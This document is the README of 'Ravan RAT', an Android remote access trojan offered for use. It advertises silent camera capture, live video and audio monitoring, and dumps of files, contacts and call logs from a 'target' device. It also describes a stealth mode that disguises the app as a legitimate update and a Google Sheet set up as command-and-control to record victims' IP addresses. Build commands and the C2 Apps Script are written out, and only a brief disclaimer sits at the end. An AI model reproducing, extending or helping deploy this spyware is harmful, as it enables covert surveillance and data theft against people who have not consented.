# 🔥 Ravan RAT

![Ravan Logo](ravanrat.png)

**Remote Android Administration Tool with Web Panel**

---

## 🚨 Google Sheet Control - No Server Needed!

> **No Port Forwarding. No Server. Just a Google Sheet.**

Control devices using just a Google Sheet!

- ✅ No need for port forwarding
- ✅ No server setup required
- ✅ Works behind any firewall/NAT
- ✅ Control from anywhere with just a Google Sheet

**Star ⭐ this repo to stay updated!**

---

## 📢 Updates Every Sunday!

New features drop every week. Star ⭐ this repo to stay updated!

**Got ideas?** Open an issue or DM me. Contributions welcome!

---

## 🚀 Quick Build

### Windows

```powershell
cd builder
.\build.ps1
```

### Linux / Mac

```bash
cd builder
chmod +x build.sh
./build.sh
```

**New Builder v2.0 Features:**

- **Signed & Unsigned APKs**: Automatically generates both `signed.apk` (for release) and `unsigned.apk`.
- **Advanced Identity**: Customize App Name, Package Name (ID), and Min SDK.
- **Stealth Mode**: Randomly generates Version Name and Version Code to look like legitimate updates.
- **Smart Logo**:
  - Automatically resizes any image to all Android densities.
  - Optional **Transparency Generation** (removes white backgrounds).
  - Forces "Legacy Mode" to bypass adaptive icons on newer Androids.

📖 **For detailed build guide, read [Builder README](builder/README.md)**

---

## 🧠 The Core Concept: Direct IPv6 Access

**"Why do I need a server? Wait, I don't!"**

During security research, we discovered a fascinating behavior in modern Android networking. When an Android device connects to mobile data (and many modern WiFi networks), it is assigned a **Public IPv6 Address**.

Unlike IPv4, which is heavily NAT'd (Network Address Translation) and requires complex Port Forwarding to access from the outside, **IPv6 addresses are often directly routeable on the public internet**.

### How Ravan RAT Exploits This:

1.  **Local HTTP Server**: The app starts a lightweight HTTP server on the Android device (Port 8080).
2.  **The IPv6 Feature/Bug**: Because the device has a Public IPv6, **you can access this server directly from anywhere in the world** just by typing the IP address in your browser. No router config, no firewall bypass, no NGROK.
3.  **The Problem (Dynamic IPs)**: Mobile networks rotate IPs frequently. Your target's IP changes every time they reconnect.
4.  **The Solution (Google Sheet)**: We use a simple Google Sheet as a **"Command & Control" (C2)** tracker. The app detects its own Public IPv6 and quietly posts it to your Google Sheet. You open the sheet, click the link, and you are connected directly to the device.

> **TL;DR**: We turn the Android phone into a public web server and use Google Sheets as a dynamic phonebook to find it.

---

## ✨ Features

**Device Access**

- 📁 **File Manager**: Browsable directory of the entire phone storage.
- 📞 **Call Logs**: Read-only view of recent calls.
- 👥 **Contacts**: Dump of local contacts.
- 📱 **Device Info**: Battery, Model, Android Version.

**Surveillance**

- 📸 **Remote Camera**: Trigger front/back camera to take silent photos.
- 🎥 **Live Stream**: Watch a low-latency MJPEG stream from the device.
- 🎤 **Audio**: Listen to ambient background noise.

---

## 📋 usage Workflow

1.  **Build & Install**: Create the APK using the builder and install it on the target.
2.  **The Link**: The app will automatically POST its location to your Google Sheet.
    - _Example_: `http://[2409:4052:2e1b:bd68:xxxx:xxxx:xxxx:xxxx]:8080`
3.  **Connect**: Click the link in your Google Sheet.
4.  **Control**: You will see the Ravan Web Panel running **directly on the phone**. All commands sent go straight to the device, and data comes straight back to you. P2P at its finest.

---

## 📊 Google Sheet Setup

Want device IPs in a spreadsheet?

1. Create Google Sheet
2. Extensions → Apps Script
3. Paste this **UPDATED** code:

```javascript
function doPost(e) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  var data = JSON.parse(e.postData.contents);

  // Get current date/time
  var timestamp = new Date();

  // Add row with: Timestamp | IP | Port | Device Name | Clickable Link
  sheet.appendRow([
    timestamp,
    data.ip,
    data.port,
    data.device,
    data.link, // <--- NEW! Direct Clickable Link
  ]);

  return ContentService.createTextOutput("Success");
}
```

4. Deploy → Web App → Anyone
5. Copy URL → Paste in builder when asked.

---

## 📂 Folder Structure

```
ravan/
├── ravanrat.png          # Logo
├── builder/
│   ├── build.sh          # Linux/Mac
│   ├── build.bat         # Windows CMD
│   ├── build.ps1         # Windows PowerShell
│   └── output/           # Built APKs (Signed & Unsigned)
└── app/                  # Android source
```

---

## 🤝 Contribute

Found a bug? Have an idea?

- Open an issue
- Submit a PR
- DM me on LinkedIn

All contributions welcome!

---

## 👨‍💻 Developer

**Somesh**

[![GitHub](https://img.shields.io/badge/GitHub-someshsrichandan-black?logo=github)](https://github.com/someshsrichandan)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-someshsrichandan-blue?logo=linkedin)](https://linkedin.com/in/someshsrichandan)

---

## ⚠️ Disclaimer

Educational purpose only. Don't use without permission. I'm not responsible for misuse.

---

## 📜 License

MIT License

---

**⭐ Star this repo for updates!**
